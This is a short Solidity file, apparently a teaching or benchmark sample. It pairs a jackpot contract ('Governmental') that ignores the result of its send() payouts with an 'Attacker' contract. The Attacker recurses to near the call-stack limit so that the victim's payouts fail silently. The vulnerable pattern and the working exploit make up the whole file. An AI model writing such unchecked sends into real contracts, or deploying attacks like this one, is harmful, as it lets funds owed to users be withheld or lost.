pragma solidity ^0.4.0;

contract Governmental {
  struct State {
    address addr;
    uint val;
  }
  State public owner;
  State public lastInvestor;
  State public jackpot = State(0, 1 ether);
  State public lastInvestmentTimestamp;
  State public ONE_MINUTE = State(0, 1 minutes);

  function Governmental() {
    owner.addr = msg.sender;
    if (msg.value < jackpot.val) throw;
  }

  function invest() {
    if (msg.value < jackpot.val / 2) throw;
    lastInvestor.addr = msg.sender;
    jackpot.val += msg.value / 2;
    lastInvestmentTimestamp.val = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp.val + ONE_MINUTE.val)
      throw;

    lastInvestor.addr.send(jackpot.val);
    owner.addr.send(this.balance - 1 ether);

    lastInvestor.addr = 0;
    jackpot.val = 1 ether;
    lastInvestmentTimestamp.val = 0;
  }
}

contract Attacker {
  struct AttackState {
    uint count;
    address target;
  }

  function attack(address target, uint count) {
    AttackState memory s = AttackState(count, target);
    if (0 <= s.count && s.count < 1023) {
      this.attack.gas(msg.gas - 2000)(s.target, s.count + 1);
    } else {
      Governmental(s.target).resetInvestment();
    }
  }
}